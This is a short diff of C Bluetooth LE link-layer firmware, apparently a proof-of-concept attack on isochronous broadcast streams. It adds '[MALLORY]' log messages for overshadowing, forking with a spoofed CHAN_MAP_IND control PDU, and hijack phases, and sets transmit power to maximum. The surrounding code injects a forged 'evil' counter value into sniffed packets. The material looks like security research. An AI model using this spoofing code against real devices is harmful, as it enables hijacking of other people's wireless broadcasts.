@@ -98,6 +98,8 @@ static void isr_spoofed_iso_ctrl_subevent_done(void *param)
 
 	radio_tmr_end_capture();
 	radio_status_reset();
+
+	printk("[MALLORY] Sent CHAN_MAP_IND control PDU (forking)\n");
 }
 
 static void isr_spoofed_iso_done(void *param)
@@ -114,6 +116,8 @@ static void isr_spoofed_iso_done(void *param)
 
 	uint16_t event_counter;
 	event_counter = (lll->payload_count / lll->bn) + lll->latency_event;
+
+	printk("[MALLORY] Sent evil payload 666 (event %u, phase %u)\n", event_counter, phase);
 
 	if ((event_counter - 1) > forking_start && (event_counter - 1) <= forking_instant) {
 		uint8_t access_addr[4];
@@ -446,8 +450,18 @@ static int prepare_cb_common(struct lll_prepare_param *p)
 		// Insert 666 (Little Endian)
 		sys_put_le32(evil_counter_val, sniffed_bis_pdu.payload);
 
+		radio_tx_power_set(8); // max power for nRF52840
+
 		radio_pkt_tx_set(&sniffed_bis_pdu);
 		radio_isr_set(isr_spoofed_iso_done, lll);
+
+		if (phase == 1) {
+			printk("[MALLORY] Attack ACTIVE - Phase 1 (overshadowing), event %u\n", event_counter);
+		} else if (phase == 2) {
+			printk("[MALLORY] Phase 2 (forking) - sending CHAN_MAP_IND, event %u\n", event_counter);
+		} else if (phase == 3) {
+			printk("[MALLORY] Phase 3 (hijack complete), event %u\n", event_counter);
+		}
 
 		/* If inside the forking window, allow for back-to-back TX to send Ctrl PDU */
 		if ((event_counter - 1) > forking_start && (event_counter - 1) <= forking_instant) {
